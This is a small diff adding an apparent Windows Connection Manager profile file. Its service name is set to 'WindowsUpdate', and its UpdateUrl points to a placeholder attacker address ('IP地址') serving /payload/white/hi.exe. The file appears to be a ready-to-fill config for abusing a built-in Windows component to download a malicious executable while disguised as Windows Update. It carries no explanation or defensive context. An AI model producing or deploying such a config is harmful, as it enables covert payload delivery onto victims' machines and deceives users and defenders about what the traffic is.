@@ -1,0 +1,6 @@
+[Connection Manager]
+CMSFile=config
+ServiceName=WindowsUpdate
+TunnelFile=config
+[Settings]
+UpdateUrl=http://IP地址/payload/white/hi.exe
